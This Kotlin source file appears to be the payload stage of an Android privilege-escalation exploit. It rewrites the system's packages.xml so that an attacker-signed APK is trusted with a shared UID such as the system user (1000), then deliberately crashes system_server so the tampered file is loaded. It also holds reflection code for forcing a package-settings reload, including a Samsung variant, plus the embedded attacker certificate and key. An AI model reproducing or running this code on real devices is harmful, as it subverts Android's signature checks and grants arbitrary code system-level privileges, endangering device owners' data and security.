package com.example.abxoverflow.droppedapk.utils

import android.os.ServiceManager
import android.util.Log
import io.github.kyuubiran.ezxhelper.core.finder.MethodFinder.`-Static`.methodFinder
import io.github.kyuubiran.ezxhelper.core.helper.ObjectHelper.`-Static`.objectHelper
import org.w3c.dom.Element
import org.w3c.dom.NodeList
import java.io.ByteArrayOutputStream
import java.io.File
import javax.xml.parsers.DocumentBuilderFactory
import javax.xml.transform.TransformerFactory
import javax.xml.transform.dom.DOMSource
import javax.xml.transform.stream.StreamResult
import javax.xml.xpath.XPathConstants
import javax.xml.xpath.XPathFactory
import kotlin.math.max
import kotlin.random.Random


object SignatureInjector {

    fun inject(packageSharedUidMap: Map<String, Int>) {
        // Read packages.xml and convert it to regular XML that DOM can parse

        val abx = abx2xml(File("/data/system/packages.xml").readBytes())
        // Parse XML
        val document = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(
            abx.byteInputStream()
        )

        packageSharedUidMap.forEach { (pkg, uid) ->
            Log.i("SignatureInjector", "Injecting signature for package $pkg with shared UID $uid")
            insertItems(document, pkg, uid)
        }

        // Write new XML
        ByteArrayOutputStream().use { out ->
            TransformerFactory.newInstance().newTransformer()
                .transform(DOMSource(document), StreamResult(out))

            File("/data/system/packages-backup.xml").outputStream().use { outputStream ->
                outputStream.write(out.toByteArray())
            }
        }

        // Crash system_server
        throw IllegalAccessException()
    }

    private fun insertItems(
        document: org.w3c.dom.Document,
        pkg: String,
        uid: Int
    ) {
        val xPath = XPathFactory.newInstance().newXPath()

        // Allocate <keyset> identifier
        val lastIssuedKeySetId = xPath.compile("/packages/keyset-settings/lastIssuedKeySetId")
            .evaluate(document, XPathConstants.NODE) as Element
        val lastIssuedKeyId = xPath.compile("/packages/keyset-settings/lastIssuedKeyId")
            .evaluate(document, XPathConstants.NODE) as Element
        val newKeySetId = lastIssuedKeySetId.getAttribute("value").toInt() + 1
        val newKeyId = lastIssuedKeyId.getAttribute("value").toInt() + 1
        lastIssuedKeySetId.setAttribute("value", newKeySetId.toString())
        lastIssuedKeyId.setAttribute("value", newKeyId.toString())

        // Insert <public-key> and <keyset> for newly added apk
        val publicKey = document.createElement("public-key").apply {
            setAttribute("identifier", newKeyId.toString())
            setAttribute("value", TARGET_KEY_BASE64)
        }
        (xPath.compile("/packages/keyset-settings/keys")
            .evaluate(document, XPathConstants.NODE) as Element).appendChild(publicKey)

        val keyset = document.createElement("keyset").apply {
            setAttribute("identifier", newKeySetId.toString())
            appendChild(
                document.createElement("key-id").apply {
                    setAttribute("identifier", newKeyId.toString())
                }
            )
        }
        (xPath.compile("/packages/keyset-settings/keysets")
            .evaluate(document, XPathConstants.NODE) as Element).appendChild(keyset)

        // Insert new <package>
        var newCertIndex = 0
        val certs = xPath.compile("/packages/package//cert[@index][@key]")
            .evaluate(document, XPathConstants.NODESET) as NodeList
        for (i in 0..<certs.length) {
            val certIndex = (certs.item(i) as Element).getAttribute("index").toInt()
            newCertIndex = max(newCertIndex, certIndex + 1)
        }

        val packageElem = document.createElement("package").apply {
            setAttribute("name", pkg)
            setAttribute("codePath", "/data/app/dropped_apk_${Random.nextInt()}")
            setAttribute("sharedUserId", uid.toString())
            setAttribute("publicFlags", "0")
            appendChild(
                document.createElement("sigs").apply {
                    setAttribute("count", "1")
                    setAttribute("schemeVersion", "2")
                    appendChild(
                        document.createElement("cert").apply {
                            setAttribute("index", newCertIndex.toString())
                            setAttribute("key", TARGET_CERT_HEX)
                        }
                    )
                }
            )
        }

        val firstSharedUser = xPath.compile("/packages/shared-user")
            .evaluate(document, XPathConstants.NODE) as Element
        firstSharedUser.parentNode.insertBefore(packageElem, firstSharedUser)

        // Insert <pastSigs> into <shared-user name="android.uid.system" userId="1000"><sigs>
        val sharedUser = xPath
            .compile("/packages/shared-user[@userId=\"$uid\"]/sigs")
            .evaluate(document, XPathConstants.NODE) as Element

        // Delete previously existing <pastSigs> if any
        deletePastSigsLoop@ while (true) {
            val childNodes = sharedUser.childNodes
            for (i in 0..<childNodes.length) {
                val item = childNodes.item(i)
                if (item is Element && "pastSigs" == item.nodeName) {
                    //sharedUser.removeChild(item)
                    continue@deletePastSigsLoop
                }
            }
            break
        }

        // Insert new <pastSigs>
        sharedUser.appendChild(
            document.createElement("pastSigs").apply {
                setAttribute("count", "2")
                setAttribute("schemeVersion", "3")
                for (i in 0..1) {
                    appendChild(
                        document.createElement("cert").apply {
                            setAttribute("index", newCertIndex.toString())
                            setAttribute("flags", "2")
                        }
                    )
                }
            }
        )
    }



    private fun applyChanges() {
        val svc = ServiceManager.getService("package")
            .objectHelper()
            .getObject("this$0")!!

        val settings = svc.objectHelper()
            .getObject("mSettings")!!

        // Write updated packages.xml
        /*settings.javaClass.methodFinder()
            .filterByName("getSettingsFile")
            .first()
            .invoke(settings)!!
            .cast<Closeable>()
            .use { file ->
                var str: FileOutputStream? = null
                try {
                    str = file.javaClass.methodFinder()
                        .filterByName("startWrite")
                        .first()
                        .invoke(file)!!
                        .cast<FileOutputStream>()

                    outputStream.writeTo(str)

                    file.javaClass.methodFinder()
                        .filterByName("finishWrite")
                        .filterByParamTypes(FileOutputStream::class.java)
                        .first()
                        .invoke(file, str)
                    return
                } catch (e: IOException) {
                    Log.e("SignatureInjector", "Unable to write package manager settings", e)
                    if (str != null) {
                        file.javaClass.methodFinder()
                            .filterByName("failWrite")
                            .filterByParamTypes(FileOutputStream::class.java)
                            .first()
                            .invoke(file, str)
                    }
                }
            }

        settings.javaClass.methodFinder()
            .filterByName("invalidatePackageCache")
            .filterByParamTypes(Int::class.javaPrimitiveType)
            .first()
            .invoke(settings, 6 /* INVALIDATION_REASON_WRITE_SETTINGS */)*/

        val um = ServiceManager.getService("user")
        val users = um.javaClass.methodFinder()
            .filterByName("getUsers") // returns List<UserInfo>
            .filterByParamCount(3)
            .first()
            .invoke(um, true, false, false) // excludePartial, excludeDying, excludePreCreated

        val computer = svc.objectHelper()
            .getObject("mLiveComputer")!!

        settings.javaClass.methodFinder().forEach {
            Log.e("SignatureInjector", "Settings method: ${it.name} , params: ${it.parameterTypes.joinToString()}")
        }

        // Force read packages.xml again
        settings.javaClass.methodFinder()
            .filterByName("readLPw")
            .first()
            // AOSP: readLPw(Computer computer, List<UserInfo> users)
            // Samsung: readLPw(SettingsComputer computer, List<UserInfo> users, com.samsung.android.server.pm.rescueparty.PackageManagerBackupController)
            .run {
                try {
                    val ctrl = svc.objectHelper()
                        .getObject("mCustomInjector")!!
                        .run {
                            this.javaClass.methodFinder()
                                .filterByName("getPackageManagerBackupController")
                                .first()
                                .invoke(this)!!
                        }

                    invoke(settings, computer, users, ctrl)
                }
                catch (ex: Exception) {
                    Log.w("SignatureInjector", "Failed to invoke readLPw with 3 params for Samsung, trying 2 params...", ex)

                    invoke(settings, computer, users)
                }
            }

    }

    const val TARGET_CERT_HEX: String =
        "308202a43082018c020101300d06092a864886f70d01010b050030183116301406035504030c0d61627864726f7070656461706b301e170d3233313032303038353535365a170d3438313031333038353535365a30183116301406035504030c0d61627864726f7070656461706b30820122300d06092a864886f70d01010105000382010f003082010a0282010100928c5e2732fa5e0ffad5baca33543bc54fe19b6a5d24da8cfc404ad00811f0ad7f632a6b1bf06ac9d41e3ab01bc7af4510255667ee45849ae9fa8e262156d9e3809e0fa90748f3cbf3b7480965b655f195859630f03a9ca84ccc31f9808cf87e8ac6d107d918da4c1523e787a61e6231cce4ede22934800cb2da9244728a01d757ae38b207a70c6ba5081d2ded3104ce8882558a64abe128b855e122dd1a674cd75d56171af7f08bfa07ce8de30cc8aece12ee202927d1fde3196550cc64781ed4d5c3e14c7bd80b364cc9acb8ed80c67d4bfcd984ff8f1718c370fc5d34a25c8563d0cef1e1a02fa3d975518af512d4b6ecc3e625a5d11c4deda9a6d46a80410203010001300d06092a864886f70d01010b050003820101000a524837b72e5cffddfa675b7840d014fd4bdbd360c0e8d825caf0f4667d122c1503dc21a77517e988416e648619daa94968b509aca29286a9b36b2d23c6c164ef6fa3e23fcb09ce680e19c7f4617a7e4107668096c27f0f79cddb60df79c901662dee6b864df7380023a9ac1b445ac339c04ddb4d5701d72bee30f79583de6e001631f884b5616a7a0c1094b13dfbbd29053a3c6841aa92a1e7a6ab60c2099a2fec8566f15c1163b31c0a3f12406bfaa35aff3dbfff3a352bc921d9e719569179ded2e682dbd68c8c87393baed0be66111320b187dec85b071fd850c1b41f34fc97b014d155b10c10e77cb9b5c4b4d5247aca6155463f77352fd3f20ee0a330"
    // release "308202d8308201c0a003020102021453136703198fc15c260df072e213019a610ce489300d06092a864886f70d01010b050030253123302106035504030c1a616e64726f69642d696e6a65637465642d73797374656d6b65793020170d3235313130383031323032365a180f32313235313130383031323032365a30253123302106035504030c1a616e64726f69642d696e6a65637465642d73797374656d6b657930820122300d06092a864886f70d01010105000382010f003082010a028201010095f9429dec61147e664181e2d152fa11df38a7e61d6c4f0778e516fca2685b6aa51b026cfa1376a13cb1e5d369de31d89588a3c203063dbba7a165c9f3326b6f2864af1f8efd1c9ae8b46b51f21b619bdc3c725b8a82cf681646bf7f00a221acb28d7cc863039d5a9b1ee3c2943211ce7087a9e7798d5fb84dc0f6255fa27600ef7d29e26fa55beb9bf795579c81b6aaf51ad897c32c6704bdf382dd68945ff2ed482df27a4d995450ed491135fecc8e6a101aebcb806f2052823f7a96a127163240ae6e4dfed120c9c8ad4c158d7c607df93437482d93dcfd10e607b5e6c7df845f11d0010ccd12d1bee3a43522917fda776ffdb3bca3cda9bdbbbc5208642d0203010001300d06092a864886f70d01010b050003820101002c47f56512edc259ca852bb03736f4a9dfa3ced840b74b7cd0e61b8dd78894e4918516b09aa92dc720ae65b8910a4d31f8f2608bf4432b977656483188bf034256e19c312ca0c471f6edbc6bf95055710548f74591679faf35d342219df0c89b410b0a45544828fe42dd223747cd40a67a4d9e82d192d8e62e838b953dbb32f38ea44e08755e9f827da5d41d14c91349f4f7f8c0a815e347d5b73dc7e373d20586579c53f5cf06ec78f9041c311905e53aa06389c55be40d05a5d546214c92a384fd6f8cb91d9726b98a64135c756c5e462cae203c943e0d98677348330743d93ffa34377601fc343a8d2b1ce747770db5d9ef67278a9244b56f47df3a4f6114";

    const val TARGET_KEY_BASE64: String =
        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlflCnexhFH5mQYHi0VL6" +
                "Ed84p+YdbE8HeOUW/KJoW2qlGwJs+hN2oTyx5dNp3jHYlYijwgMGPbunoWXJ8zJr" +
                "byhkrx+O/Rya6LRrUfIbYZvcPHJbioLPaBZGv38AoiGsso18yGMDnVqbHuPClDIR" +
                "znCHqed5jV+4TcD2JV+idgDvfSnib6Vb65v3lVecgbaq9RrYl8MsZwS984LdaJRf" +
                "8u1ILfJ6TZlUUO1JETX+zI5qEBrry4BvIFKCP3qWoScWMkCubk3+0SDJyK1MFY18" +
                "YH35NDdILZPc/RDmB7Xmx9+EXxHQAQzNEtG+46Q1IpF/2ndv/bO8o82pvbu8Ughk" +
                "LQIDAQAB"

}